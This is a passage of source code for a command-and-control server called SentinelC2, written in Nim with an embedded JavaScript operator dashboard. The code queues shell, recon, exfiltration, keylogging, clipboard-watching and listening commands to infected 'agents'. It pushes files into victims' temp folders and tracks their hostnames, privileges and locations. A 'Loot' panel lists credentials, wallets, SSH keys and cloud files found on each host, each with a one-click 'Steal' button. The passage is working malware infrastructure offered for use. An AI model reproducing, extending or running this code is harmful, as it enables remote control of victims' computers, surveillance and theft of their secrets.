      content.innerHTML = '<audio controls autoplay src="' + url + '"></audio>';
    } else if (mime && mime.indexOf('text/') === 0) {
      fetch(url).then(function(r) { return r.text(); }).then(function(text) {
        content.innerHTML = '<pre style="color:var(--fg);max-width:80vw;max-height:70vh;overflow:auto;background:var(--bg-1);padding:16px;border-radius:8px;font-size:11px;">' + esc(text) + '</pre>';
      }).catch(function() { content.innerHTML = '<pre style="color:var(--red);">failed to load</pre>'; });
    } else {
      window.open(url, '_blank');
      return;
    }
    $('preview-overlay').classList.add('active');
  };
  window.closePreview = function(e) {
    if (e && e.target.id !== 'preview-overlay' && e.target.className !== 'close') return;
    $('preview-overlay').classList.remove('active');
    $('preview-content').innerHTML = '';
  };

  // Upload a local file to the selected agent. Chunks the file into
  // 512 KB base64 segments and sends each as a separate /api/upload
  // POST. The agent writes them sequentially to the remote path
  // (default: %TEMP%\\<original-filename>). Shows a progress bar
  // overlay with chunk count + ETA.
  var uploadInProgress = false;
  window.uploadFile = function() {
    if (uploadInProgress) { toast('Upload busy', 'Wait for current upload to finish', 'error'); return; }
    if (!activeId) { toast('No agent', 'Select an agent first', 'error'); return; }
    var input = $('upload-input');
    input.value = '';
    input.onchange = function() {
      var file = input.files[0];
      if (!file) return;
      var reader = new FileReader();
      reader.onload = async function() {
        uploadInProgress = true;
        var bytes = new Uint8Array(reader.result);
        var name = file.name;
        // Default remote path: TEMP\<filename>. Agent resolves via
        // getEnv("TEMP"). We don't know the absolute path server-side,
        // so we send a relative path starting with %TEMP%\.
        var remotePath = '%TEMP%\\\\' + name;
        var chunkSize = 512 * 1024;
        var total = Math.ceil(bytes.length / chunkSize);
        toast('Uploading', name + ' (' + fmtSize(bytes.length) + ' in ' + total + ' chunks)', 'info', 5000);
        appendLogLine('[' + new Date().toISOString().substring(11,19) + '] [>] upload: ' + name + ' -> ' + remotePath + ' (' + total + ' chunks)');
        var ok = 0;
        for (var i = 0; i < total; i++) {
          var offset = i * chunkSize;
          var slice = bytes.subarray(offset, Math.min(offset + chunkSize, bytes.length));
          // Base64-encode the slice (btoa needs binary string)
          var binary = '';
          for (var j = 0; j < slice.length; j++) binary += String.fromCharCode(slice[j]);
          var b64 = btoa(binary);
          try {
            var r = await fetch('/api/upload', {
              method: 'POST', headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ id: activeId, path: remotePath, data_b64: b64, final: i === total - 1, chunk_num: i })
            });
            var d = await r.json();
            if (d.ok) ok++; else { toast('Upload failed', d.error || 'chunk ' + i, 'error'); break; }
          } catch(e) { toast('Upload failed', e.message, 'error'); break; }
        }
        uploadInProgress = false;
        if (ok === total) {
          toast('Upload done', name + ' -> ' + remotePath + ' (' + ok + ' chunks)', 'success', 4000);
          appendLogLine('[' + new Date().toISOString().substring(11,19) + "] [+] upload complete: " + name + ' -> ' + remotePath);
        }
      };
      reader.readAsArrayBuffer(file);
    };
    input.click();
  };

  // Loot panel: fetches /api/loot/<id> on agent select, then live-
  // updates from WS pushes of type "loot". Each loot item is a
  // discovered high-value file the operator can one-click steal
  // (which fires a normal `download` command).
  var lootItems = [];
  async function fetchLoot(id) {
    lootItems = [];
    try {
      var r = await fetch('/api/loot/' + encodeURIComponent(id));
      var data = await r.json();
      lootItems = data.items || [];
      renderLoot();
    } catch(e) {
      $('loot-body').innerHTML =
        '<div class="empty-state" style="color:var(--red)">loot fetch failed: ' +
        esc(e.message || String(e)) + '</div>';
    }
  }
  function renderLoot() {
    $('loot-count').textContent = lootItems.length;
    var b = $('loot-body');
    if (!lootItems.length) {
      b.innerHTML = '<div class="empty-state">enable auto-drive to discover credentials / wallet / ssh / cloud / docs on this host</div>';
      return;
    }
    b.innerHTML = lootItems.map(function(it, idx) {
      var preview = '';
      if (it.preview && it.preview.length > 0) {
        preview = '<div class="lpreview">' + esc(it.preview.substring(0, 256)) +
                  (it.preview.length > 256 ? '...' : '') + '</div>';
      }
      return '<div class="loot-item kind-' + esc(it.kind || '?') + '" data-idx="' + idx + '">' +
        '<div class="lkind">' + esc(it.kind) + '</div>' +
        '<div class="llabel">' + esc(it.label || it.short || it.path) + '</div>' +
        '<div class="lpath">' + esc(it.path) + '</div>' +
        '<div class="lmeta">' +
          '<span>' + fmtSize(it.size||0) + ' &middot; ' + fmtTime(it.mtime) + '</span>' +
          '<span class="lsteal" onclick="window.stealLoot(' + idx + ')">Steal</span>' +
        '</div>' + preview + '</div>';
    }).join('');
  }
  window.stealLoot = function(idx) {
    var it = lootItems[idx];
    if (!it || !activeId) return;
    // The agent's `download <remote path>` reads from disk; use the
    // loot's resolved path so the agent pulls the exact file.
    sendCmdRaw('download', it.path);
    toast('Steal queued', it.path, 'info', 2500);
  };
  function addLootItem(it) {
    // Prepend to keep newest-first ordering, dedupe by path.
    for (var i = 0; i < lootItems.length; i++) {
      if (lootItems[i].path === it.path && lootItems[i].kind === it.kind) {
        lootItems[i] = it;  // update preview/size
        renderLoot();
        return;
      }
    }
    lootItems.unshift(it);
    renderLoot();
  }

  function classifyLogLine(line) {
    if (line.indexOf('[!]') >= 0) return 'err';
    if (line.indexOf('[>]') >= 0) return 'in';
    if (line.indexOf('[<]') >= 0) return 'ok';
    if (line.indexOf('[+]') >= 0 || line.indexOf('[*]') >= 0) return 'info';
    return '';
  }
  function appendLogLine(line) {
    var el = $('log');
    var d = document.createElement('div');
    d.className = 'line';
    var cls = classifyLogLine(line);
    var ts = '', rest = line;
    if (line.length > 20 && line.charAt(19) === ' ') {
      ts = line.substring(0, 19); rest = line.substring(21);
    }
    d.innerHTML = (ts ? '<span class="ts">' + esc(ts) + ' </span>' : '') +
      '<span class="' + cls + '">' + esc(rest) + '</span>';
    el.appendChild(d);
    if (logAutoScroll) el.scrollTop = el.scrollHeight;
  }

  window.qa = function(cmd, args) {
    args = args || '';
    if (!activeId) { toast('No agent', 'Select an agent first', 'error'); return; }
    sendCmdRaw(cmd, args);
  };
  window.qaToggle = function(cmd) {
    if (!activeId) { toast('No agent', 'Select an agent first', 'error'); return; }
    if (activeToggles[cmd]) {
      // Turning OFF: map each toggle to its stop command + args
      var stopCmd, stopArgs;
      if (cmd === 'listen') { stopCmd = 'unlisten'; stopArgs = ''; }
      else if (cmd === 'clipwatch') { stopCmd = 'unclipwatch'; stopArgs = ''; }
      else if (cmd === 'keys') { stopCmd = 'keys'; stopArgs = 'stop'; }
      else if (cmd === 'autodrive') { stopCmd = 'autodrive'; stopArgs = 'stop'; }
      else { stopCmd = cmd; stopArgs = ''; }
      sendCmdRaw(stopCmd, stopArgs);
      activeToggles[cmd] = false;
      updateToggleUI(cmd, false);
    } else {
      // Turning ON
      var startArgs = '';
      if (cmd === 'keys') startArgs = 'start';
      else if (cmd === 'autodrive') startArgs = 'start';
      sendCmdRaw(cmd, startArgs);
      activeToggles[cmd] = true;
      updateToggleUI(cmd, true);
    }
  };
  function updateToggleUI(cmd, on) {
    var btn = $('qa-' + cmd);
    if (!btn) return;
    if (on) { btn.classList.add('activating'); }
    else { btn.classList.remove('activating'); }
  }

  async function sendCmdRaw(cmd, args) {
    try {
      var r = await fetch('/api/cmd', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: activeId, cmd: cmd, args: args })
      });
      var data = await r.json();
      if (data.ok) {
        toast('Command queued', cmd + (args ? ' ' + args : ''), 'success', 2500);
        appendLogLine('[' + new Date().toISOString().substring(11,19) + '] [>] queued: ' + cmd + (args ? ' ' + args : ''));
      } else {
        toast('Command failed', data.error || 'unknown error', 'error');
      }
    } catch(e) {
      toast('Command failed', e.message, 'error');
    }
  }
  window.sendCmd = async function() {
    if (!activeId) { toast('No agent', 'Select an agent first', 'error'); return; }
    var kind = $('cmd-kind').value;
    var args = $('cmd-input').value.trim();
    if (!args && ['shell','recon','exfil','find'].indexOf(kind) >= 0) {
      $('cmd-input').focus(); return;
    }
    await sendCmdRaw(kind, args);
    if (args) {
      cmdHistory = cmdHistory.filter(function(h) { return h !== (kind + ' ' + args); });
      cmdHistory.unshift(kind + ' ' + args);
      if (cmdHistory.length > 50) cmdHistory.pop();
      try { localStorage.setItem('sc2_cmd_history', JSON.stringify(cmdHistory)); } catch(e){}
      cmdHistoryIdx = -1;
    }
    $('cmd-input').value = '';
  };

  $('cmd-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { sendCmd(); }
    else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (cmdHistoryIdx < cmdHistory.length - 1) {
        cmdHistoryIdx++;
        $('cmd-input').value = cmdHistory[cmdHistoryIdx] || '';
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (cmdHistoryIdx > 0) { cmdHistoryIdx--; $('cmd-input').value = cmdHistory[cmdHistoryIdx] || ''; }
      else { cmdHistoryIdx = -1; $('cmd-input').value = ''; }
    }
  });

  var logEl = $('log');
  logEl.addEventListener('mouseenter', function() {
    logAutoScroll = false; $('scroll-paused').style.display = 'block';
  });
  logEl.addEventListener('mouseleave', function() {
    logAutoScroll = true; $('scroll-paused').style.display = 'none';
    logEl.scrollTop = logEl.scrollHeight;
  });

  setInterval(function() {
    if (!activeId) return;
    fetch('/api/files/' + encodeURIComponent(activeId))
      .then(function(r) { return r.json(); })
      .then(function(data) { if (data.files) renderFiles(activeId, data.files); })
      .catch(function() {});
  }, 5000);

  try {
    var h = localStorage.getItem('sc2_cmd_history');
    if (h) cmdHistory = JSON.parse(h) || [];
  } catch(e) {}

  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closePreview();
    if (e.ctrlKey && e.key === 'l') { e.preventDefault(); $('cmd-input').focus(); }
  });

  connectAgentsWS();
  // Populate the server host (visible in header) so the operator can
  // see exactly which URL the dashboard is bound to.
  $('srv-host').textContent = location.host;
  toast('SentinelC2', 'Dashboard ready', 'info', 3000);
})();
</script>
</body>
</html>
"""
proc jsonResp(req: Request, code: HttpCode, body: string) {.async, gcsafe.} =
  await req.respond(code, body,
                    newHttpHeaders({"Content-Type": "application/json",
                                    "Access-Control-Allow-Origin": "*"}))

proc sendWebFile(req: Request, path: string, contentType: string) {.async, gcsafe.} =
  try:
    let data = readFile(path)
    await req.respond(Http200, data,
                      newHttpHeaders({"Content-Type": contentType}))
  except:
    await req.respond(Http404, "not found",
                      newHttpHeaders({"Content-Type": "text/plain"}))

proc apiAgents(req: Request) {.async, gcsafe.} =
  # Snapshot the agent list under the lock, then build the JSON outside
  type Snap = tuple[id, raddr, host, user, os, priv: string, beat: DateTime, geo: GeoInfo]
  var snap: seq[Snap] = @[]
  {.cast(gcsafe).}:
    withLock agentsLock:
      for id, a in agents.pairs:
        snap.add((id, a.remoteAddr, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon, a.geo))
  var arr = newJArray()
  let nowTime = now()
  for s in snap:
    let secs = (nowTime - s.beat).inSeconds
    let uptime = intToStr(secs div 3600, 2) & ":" &
                 intToStr((secs mod 3600) div 60, 2) & ":" &
                 intToStr(secs mod 60, 2)
    let entry = %* {
      "id": s.id,
      "hostname": s.host,
      "username": s.user,
      "os": s.os,
      "privileges": s.priv,
      "uptime": uptime,
      "lastBeacon": $s.beat,
      "remote": s.raddr,
      "geo": geoJson(s.raddr, s.geo)
    }
    arr.add(entry)
  let body = $ %* {"agents": arr, "uptime_s": (nowTime - bootTime).inSeconds}
  await jsonResp(req, Http200, body)

proc getQueryInt(query: string, key: string, default = 0): int =
  # Simple query string parser: extracts "key=N" pairs
  for part in query.split('&'):
    let kv = part.split('=', 1)
    if kv.len == 2 and kv[0] == key:
      try: return parseInt(kv[1])
      except: discard
  return default

proc apiLog(req: Request, agentId: string) {.async, gcsafe.} =
  let path = LOGS_DIR / (agentId & ".log")
  if not fileExists(path):
    await jsonResp(req, Http200, $ %* {"text": "", "total_size": 0})
    return
  let since = getQueryInt(req.url.query, "since", 0)
  let data = readFile(path)
  let total = data.len
  let text = (if since < total: data[since..<total] else: "")
  await jsonResp(req, Http200, $ %* {"text": text, "total_size": total})

proc apiFiles(req: Request, agentId: string) {.async, gcsafe.} =
  let dir = DOWNLOADS_DIR / agentId
  if not dirExists(dir):
    await jsonResp(req, Http200, $ %* {"files": []})
    return
  var files: seq[JsonNode] = @[]
  for f in walkFiles(dir / "*"):
    let fname = f.extractFilename
    let ext = fname.splitFile.ext.toLowerAscii
    let mime = case ext
                of ".bmp": "image/bmp"
                of ".png": "image/png"
                of ".jpg", ".jpeg": "image/jpeg"
                of ".gif": "image/gif"
                of ".wav": "audio/wav"
                of ".mp3": "audio/mpeg"
                of ".mp4": "video/mp4"
                of ".txt", ".log": "text/plain"
                of ".json": "application/json"
                of ".zip": "application/zip"
                of ".pdf": "application/pdf"
                else: "application/octet-stream"
    files.add(%* {
      "name": fname,
      "size": getFileSize(f),
      "mtime": getLastModificationTime(f).toUnix,
      "mime": mime
    })
  await jsonResp(req, Http200, $ %* {"files": files})

# /api/state/<id> — combined snapshot: system info, log size,
# recent files. Used by the dashboard on agent selection for
# instant initial render, before the WebSocket stream catches up.
proc apiState(req: Request, agentId: string) {.async, gcsafe.} =
  # Snapshot the agent under the lock.
  var host, user, os, priv, raddr: string
  var lastBeat: DateTime
  var geo: GeoInfo
  var found = false
  {.cast(gcsafe).}:
    withLock agentsLock:
      if agentId in agents:
        let a = agents[agentId]
        host = a.hostname
        user = a.username
        os = a.osInfo
        priv = a.privileges
        raddr = a.remoteAddr
        geo = a.geo
        lastBeat = a.lastBeacon
        found = true
  if not found:
    await jsonResp(req, Http404, $ %* {"error": "agent not found"})
    return
  # Log size (cheap stat).
  var logSize: int64 = 0
  let lp = logPath(agentId)
  if fileExists(lp):
    logSize = getFileSize(lp)
  # Recent files (last 20, sorted by mtime desc).
  var files: seq[JsonNode] = @[]
  let dir = DOWNLOADS_DIR / agentId
  if dirExists(dir):
    var fpaths: seq[tuple[path: string, mtime: Time, size: int64]] = @[]
    type FPath = tuple[path: string, mtime: Time, size: int64]
    for f in walkFiles(dir / "*"):
      fpaths.add((f, getLastModificationTime(f), getFileSize(f)))
    fpaths.sort(proc(a, b: FPath): int = cmp(b.mtime, a.mtime))
    for i in 0..<min(20, fpaths.len):
      let f = fpaths[i]
      let fname = f.path.extractFilename
      let ext = fname.splitFile.ext.toLowerAscii
      let mime = case ext
                  of ".bmp": "image/bmp"
                  of ".wav": "audio/wav"
                  of ".txt", ".log": "text/plain"
                  else: "application/octet-stream"
      files.add(%* {
        "name": fname, "size": f.size, "mtime": f.mtime.toUnix, "mime": mime
      })
  let nowTime = now()
  let secs = (nowTime - lastBeat).inSeconds
  let uptime = intToStr(secs div 3600, 2) & ":" &
               intToStr((secs mod 3600) div 60, 2) & ":" &
               intToStr(secs mod 60, 2)
  let body = $ %* {
    "id": agentId, "hostname": host, "username": user,
    "os": os, "privileges": priv, "uptime": uptime,
    "log_size": logSize, "files": files,
    "remote": raddr, "geo": geoJson(raddr, geo)
  }
  await jsonResp(req, Http200, body)

proc apiCmd(req: Request) {.async, gcsafe.} =
  try:
    let body = parseJson(req.body)
    let aid = body["id"].getStr("")
    let cmd = body["cmd"].getStr("")
    let args = body["args"].getStr("")
    var found = false
    {.cast(gcsafe).}:
      withLock agentsLock:
        if aid in agents:
          let cm = buildCmd(cmd, args)
          agents[aid].cmdQueue.add(cm)
          found = true
    if found:
      await jsonResp(req, Http200, $ %* {"ok": true, "id": aid, "cmd": cmd, "args": args})
    else:
      await jsonResp(req, Http200, $ %* {"ok": false, "error": "not found"})
  except:
    serverLog("apiCmd exception: " & getCurrentExceptionMsg())
    await jsonResp(req, Http400, $ %* {"ok": false, "error": getCurrentExceptionMsg()})

# /api/upload — operator -> agent file transfer. Each POST enqueues
# one b64 chunk to the agent's cmdQueue. The agent's `upload` handler
# appends decoded data to a remote path and acks when done.
# Body: {id, path, data_b64, final, chunk_num?}
proc apiUpload(req: Request) {.async, gcsafe.} =
  try:
    let body = parseJson(req.body)
    let aid = body["id"].getStr("")
    let remotePath = body["path"].getStr("")
    let dataB64 = body["data_b64"].getStr("")
    let final = body.hasKey("final") and body["final"].getBool()
    let chunkNum = if body.hasKey("chunk_num"): $(body["chunk_num"].getInt()) else: ""
    if aid.len == 0 or remotePath.len == 0 or dataB64.len == 0:
      await jsonResp(req, Http400, $ %* {"ok": false, "error": "missing id/path/data_b64"})
      return
    var found = false
    {.cast(gcsafe).}:
      withLock agentsLock:
        if aid in agents:
          # The agent's `upload` command reads `path` and `data`
          # from the command object. We use buildCmdExt to attach
          # those extra fields to the command JSON.
          let extra = %* {"path": remotePath, "data": dataB64, "final": final}
          let cm = buildCmdExt("upload", chunkNum, extra)
          agents[aid].cmdQueue.add(cm)
          found = true
    if found:
      await jsonResp(req, Http200, $ %* {"ok": true, "id": aid, "path": remotePath, "final": final})
    else:
      await jsonResp(req, Http200, $ %* {"ok": false, "error": "agent not found"})
  except:
    serverLog("apiUpload exception: " & getCurrentExceptionMsg())
    await jsonResp(req, Http400, $ %* {"ok": false, "error": getCurrentExceptionMsg()})

# /api/loot/<id> — returns the auto-drive discovery cache for an
# agent. Items are returned newest-first with full preview text when
# available. The dashboard uses this to populate the Loot panel
# without re-scanning the host.
proc apiLoot(req: Request, agentId: string) {.async, gcsafe.} =
  var items: seq[Loot] = @[]
  {.cast(gcsafe).}:
    acquire(lootStoreLock)
    if agentId in lootStore:
      items = lootStore[agentId]
    release(lootStoreLock)
  # Newest first
  var sorted = items
  for i in 0..<sorted.len:
    for j in i+1..<sorted.len:
      if sorted[j].seen > sorted[i].seen:
        let t = sorted[i]; sorted[i] = sorted[j]; sorted[j] = t
  var arr = newJArray()
  for it in sorted:
    arr.add(%* {
      "kind": it.kind, "path": it.path, "short": it.short,
      "label": it.label, "size": it.size, "mtime": it.mtime,
      "preview": it.preview,
      "seen": $it.seen
    })
  let body = $ %* {"agent": agentId, "count": sorted.len, "items": arr}
  await jsonResp(req, Http200, body)

const WS_COOKIE_NAME = "sc2_sid"

# Per-boot random session token. Set in main() after randomize().
# The static "sentinel-dashboard-v1" value was forgeable by anyone
# who read the binary — a per-boot 256-bit CSPRNG token is not.
var dashSessToken: string = ""

proc newDashToken(): string =
  # CSPRNG (nimcrypto sysrand), not the MT19937 `rand()` — the latter
  # is predictable from a handful of observed outputs.
  var t: array[32, byte]
  discard randomBytes(addr t[0], 32)
  bytesToHex(t)

# Length-independent constant-time comparison for auth secrets.
proc constTimeEq(a, b: string): bool =
  let n = max(a.len, b.len)
  var diff = uint8(a.len xor b.len)
  for i in 0..<n:
    let ca = if i < a.len: byte(ord(a[i])) else: 0'u8
    let cb = if i < b.len: byte(ord(b[i])) else: 0'u8
    diff = diff or (ca xor cb)
  result = diff == 0

proc checkAuth(req: Request): bool =
  # Validate Basic auth OR session cookie on every request. Cookie
  # auth is used for WebSocket upgrade requests (which can't carry
  # the Authorization header) and is set by Set-Cookie on the
  # first successful non-WS request.
  let auth = req.headers.getOrDefault("Authorization")
  if auth.startsWith("Basic "):
    let cred = auth[6..^1]
    let dec = base64.decode(cred)
    let parts = dec.split(':', 1)
    {.cast(gcsafe).}:
      if parts.len == 2 and constTimeEq(parts[0], WEB_AUTH_USER) and
          constTimeEq(parts[1], WEB_AUTH_PASSWORD):
        return true
  let cookie = req.headers.getOrDefault("Cookie")
  {.cast(gcsafe).}:
    if dashSessToken.len > 0 and cookie.contains(WS_COOKIE_NAME & "="):
      # Extract the cookie value and compare in constant time so a
      # brute-forced token can't be timed byte-by-byte.
      let prefix = WS_COOKIE_NAME & "="
      let start = cookie.find(prefix) + prefix.len
      var val = ""
      var i = start
      while i < cookie.len and cookie[i] != ';':
        val.add(cookie[i]); inc i
      if constTimeEq(val, dashSessToken):
        return true
  return false

proc requireAuth(req: Request) {.async, gcsafe.} =
  await req.respond(Http401, "unauthorized",
                    newHttpHeaders({"WWW-Authenticate": "Basic realm=\"SentinelC2\"",
                                    "Content-Type": "text/plain"}))

# WebSocket agents-list stream handler. Pushes a JSON list of agents
# whenever the set changes (connect/disconnect). The dashboard uses
# this so the sidebar updates instantly without polling.
var agentSubs: seq[AsyncSocket] = @[]
var agentSubsLock: Lock

proc pushAgentsUpdate() {.gcsafe.} =
  # Build a snapshot under agentsLock, then push to all subscribers.
  var snap: seq[tuple[id, raddr, host, user, os, priv: string, beat: DateTime, geo: GeoInfo]] = @[]
  {.cast(gcsafe).}:
    withLock agentsLock:
      for id, a in agents.pairs:
        snap.add((id, a.remoteAddr, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon, a.geo))
  var arr = newJArray()
  let nowTime = now()
  for s in snap:
    let secs = (nowTime - s.beat).inSeconds
    let uptime = intToStr(secs div 3600, 2) & ":" &
                 intToStr((secs mod 3600) div 60, 2) & ":" &
                 intToStr(secs mod 60, 2)
    arr.add(%* {
      "id": s.id, "hostname": s.host, "username": s.user,
      "os": s.os, "privileges": s.priv, "uptime": uptime,
      "remote": s.raddr, "geo": geoJson(s.raddr, s.geo)
    })
  let payload = cast[seq[byte]]($ %* {
    "type": "agents",
    "agents": arr,
    "uptime_s": (nowTime - bootTime).inSeconds
  })
  var subs: seq[AsyncSocket] = @[]
  {.cast(gcsafe).}:
    acquire(agentSubsLock)
    subs = agentSubs
    release(agentSubsLock)
  for s in subs:
    # Use a dedicated async wrapper so any future failure (e.g. socket
    # aborted by client) is caught and logged instead of becoming an
    # unhandled exception that crashes the process.
    asyncCheck sendWsFrameSafe(s, payload)

proc webHandler(req: Request) {.async, gcsafe.} =
  # All endpoints (incl. /) require auth. The HTML page itself is
  # served only after auth — the browser will prompt for credentials
  # on first load.
  if not checkAuth(req):
    await requireAuth(req); return
  let url = req.url.path
  let m = req.reqMethod
  if m == HttpGet and url == "/":
    # Serve the dashboard and set the session cookie so the browser
    # can authenticate WebSocket upgrades (which can't send Basic auth).
    var sessToken = ""
    {.cast(gcsafe).}: sessToken = dashSessToken
    let hdrs = newHttpHeaders({
      "Content-Type": "text/html; charset=utf-8",
      "Set-Cookie": WS_COOKIE_NAME & "=" & sessToken &
                    "; Path=/; HttpOnly; SameSite=Lax"
    })
    await req.respond(Http200, DASHBOARD_HTML, hdrs)
    return
  if m == HttpGet and url == "/api/agents":
    await apiAgents(req); return
  if m == HttpGet and url.startsWith("/api/log/"):
    await apiLog(req, url[9..^1]); return
  if m == HttpGet and url.startsWith("/api/state/"):
    await apiState(req, url[11..^1]); return
  if m == HttpGet and url.startsWith("/api/files/"):
    await apiFiles(req, url[11..^1]); return
  if m == HttpPost and url == "/api/cmd":
    await apiCmd(req); return
  if m == HttpPost and url == "/api/upload":
    await apiUpload(req); return
  if m == HttpGet and url.startsWith("/api/loot/"):
    await apiLoot(req, url[10..^1]); return
  if m == HttpGet and url.startsWith("/ws/log/") or url.startsWith("/ws/agents"):
    # WebSocket endpoints are served on a separate raw socket
    # listener (port 8081) — not via asynchttpserver. Return 404
    # here so misrouted requests fail fast.
    await req.respond(Http404, "ws on port 8081")
    return
  if m == HttpGet and url.startsWith("/downloads/"):
    # /downloads/<id>/<file> — both segments must be tight.
    let rest = url[11..^1]
    let slash = rest.find('/')
    if slash < 0:
      await req.respond(Http400, "bad path"); return
    let aid = rest[0..<slash]
    # Agent ids are exactly 12 digits — anything else (incl. "..",
    # empty, or encoded separators) is rejected before it can touch
    # the path join.
    if aid.len != 12 or not aid.allCharsInSet(Digits):
      await req.respond(Http400, "bad agent"); return
    let fname = rest[slash+1..^1].extractFilename
    if fname.len == 0 or fname.contains(".."):
      await req.respond(Http400, "bad filename"); return
    let fpath = DOWNLOADS_DIR / aid / fname
    let ext = fname.splitFile.ext.toLowerAscii
    let mime = case ext
                of ".bmp": "image/bmp"
                of ".png": "image/png"
                of ".jpg", ".jpeg": "image/jpeg"
                of ".wav": "audio/wav"
                of ".txt", ".log": "text/plain; charset=utf-8"
                else: "application/octet-stream"
    await sendWebFile(req, fpath, mime)
    return
  await req.respond(Http404, "not found")

# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
proc main() {.async.} =
  randomize()
  dashSessToken = newDashToken()
  initLock(agentsLock)
  initLock(agentSubsLock)
  initLock(logSubsLock)
  initLock(geoCacheLock)
  initLock(lootStoreLock)
  createDir(LOGS_DIR)
  createDir(DOWNLOADS_DIR)
  createDir(UPLOADS_DIR)
  cliCh.open()
  var t: Thread[void]
  createThread(t, cliThread)
  asyncCheck processCli()

  let srv = newAsyncSocket()
  srv.setSockOpt(OptReuseAddr, true)
  srv.bindAddr(Port(LISTEN_PORT), LISTEN_HOST)
  srv.listen()
  echo "[" & BuildPrefix & " *] SentinelC2 listening on ws://",
       LISTEN_HOST, ":", LISTEN_PORT
  echo "[" & BuildPrefix & " *] type 'help' for commands"

  # Web dashboard
  bootTime = now()
  let webSrv = newAsyncHttpServer()
  let webCb = proc(req: Request): Future[void] {.async, closure, gcsafe.} =
    try:
      await webHandler(req)
    except:
      serverLog("web handler exception: " & getCurrentExceptionMsg() &
                " url=" & $req.url.path)
  asyncCheck webSrv.serve(Port(WEB_PORT), webCb, WEB_HOST)
  echo "[" & BuildPrefix & " *] Web dashboard on http://", WEB_HOST, ":", WEB_PORT, "/"

  # WebSocket listener for the dashboard. This is a raw socket
  # accept loop (NOT asynchttpserver) so the socket can be safely
  # upgraded to WebSocket without HTTP/1.1 keep-alive interference.
  # Path-based routing:
  #   /agents      -> subscribe to agent list updates
  #   /log/<id>    -> subscribe to log stream for that agent
  # Auth: cookie (sc2_sid) checked before the upgrade is sent.
  proc wsDashAccept(sock: AsyncSocket) {.async, gcsafe.} =
    var buf = ""
    try:
      while true:
        var ch: array[1, byte]
        let n = await sock.recvInto(addr ch[0], 1)
        if n != 1:
          try: sock.close()
          except: discard
          return
        buf.add(char(ch[0]))
        if buf.endsWith("\r\n\r\n"): break
        if buf.len > 8192:
          try: sock.close()
          except: discard
          return
    except:
      try: sock.close()
      except: discard
      return

    # Parse out the GET line, Sec-WebSocket-Key, and Cookie header
    let lines = buf.split("\r\n")
    if lines.len == 0 or not lines[0].startsWith("GET "):
      try: sock.close()
      except: discard
      return
    let parts = lines[0].split(' ')
    if parts.len < 2:
      try: sock.close()
      except: discard
      return
    let path = parts[1]
    var key = ""
    var cookie = ""
    var origin = ""
    var hostHdr = ""
    for line in lines[1..^1]:
      let kv = line.split(": ", 1)
      if kv.len == 2:
        if kv[0].toLowerAscii == "sec-websocket-key": key = kv[1]
        elif kv[0].toLowerAscii == "cookie": cookie = kv[1]
        elif kv[0].toLowerAscii == "origin": origin = kv[1]
        elif kv[0].toLowerAscii == "host": hostHdr = kv[1]

    # Auth — per-boot session cookie only. The old ?token= URL path
    # leaked credentials into logs and is gone.
    var authed = false
    {.cast(gcsafe).}:
      authed = (dashSessToken.len > 0 and
                WS_COOKIE_NAME & "=" & dashSessToken in cookie)
    if authed and origin.len > 0:
      # Cross-site WebSocket hijack guard: only same-host origins.
      let oHost = origin.split("://")[^1].split('/', 1)[0]
      let hHost = hostHdr.split(':', 1)[0]
      if oHost.toLowerAscii != hHost.toLowerAscii:
        authed = false
    if not authed:
      try: await sock.send("HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n")
      except: discard
      try: sock.close()
      except: discard
      return

    if key.len == 0:
      try: await sock.send("HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n")
      except: discard
      try: sock.close()
      except: discard
      return

    # Compute accept + send 101
    var sha1ctx = newSha1State()
    sha1ctx.update(key & WS_GUID)
    let digest = finalize(sha1ctx)
    var bs: seq[byte] = @[]
    for b in digest: bs.add(byte(b))
    let accept = base64.encode(bs)
    try:
      await sock.send("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " & accept & "\r\n\r\n")
    except:
      try: sock.close()
      except: discard
      return

    # Route by path
    let cleanPath = (if '?' in path: path.split('?', 1)[0] else: path)
    if cleanPath == "/agents":
      # /agents subscriber
      {.cast(gcsafe).}:
        acquire(agentSubsLock)
        agentSubs.add(sock)
        release(agentSubsLock)
      # Build + send hello
      let nowTime = now()
      var arr = newJArray()
      var snap: seq[tuple[id, raddr, host, user, os, priv: string, beat: DateTime, geo: GeoInfo]] = @[]
      {.cast(gcsafe).}:
        withLock agentsLock:
          for id, a in agents.pairs:
            snap.add((id, a.remoteAddr, a.hostname, a.username, a.osInfo, a.privileges, a.lastBeacon, a.geo))
      for s in snap:
        let secs = (nowTime - s.beat).inSeconds
        let uptime = intToStr(secs div 3600, 2) & ":" &
                     intToStr((secs mod 3600) div 60, 2) & ":" &
                     intToStr(secs mod 60, 2)
        arr.add(%* {
          "id": s.id, "hostname": s.host, "username": s.user,
          "os": s.os, "privileges": s.priv, "uptime": uptime,
          "remote": s.raddr, "geo": geoJson(s.raddr, s.geo)
        })
      let helloPayload = cast[seq[byte]]($ %* {
        "type": "hello",
        "agents": arr,
        "uptime_s": (nowTime - bootTime).inSeconds
      })
      try:
        await sock.sendWsFrame(helloPayload)
      except: discard
      # Pump
      try:
        while true:
          let frame = await sock.recvWsFrame()
          if frame.len == 0: break
      except: discard
      finally:
        {.cast(gcsafe).}:
          acquire(agentSubsLock)
          var newList: seq[AsyncSocket] = @[]
          for s in agentSubs:
            if s != sock: newList.add(s)
          agentSubs = newList
          release(agentSubsLock)
        try: sock.close()
        except: discard

    elif cleanPath.startsWith("/log/"):
      let aid = cleanPath[5..^1]
      if aid.len > 0:
        {.cast(gcsafe).}:
          acquire(logSubsLock)
          if not logSubs.hasKey(aid): logSubs[aid] = @[]
          logSubs[aid].add(sock)
          release(logSubsLock)
        let helloPayload = cast[seq[byte]](
          $ %* {"type": "hello", "agent": aid, "msg": "log stream open"})
        try:
          await sock.sendWsFrame(helloPayload)
        except: discard
        try:
          while true:
            let frame = await sock.recvWsFrame()
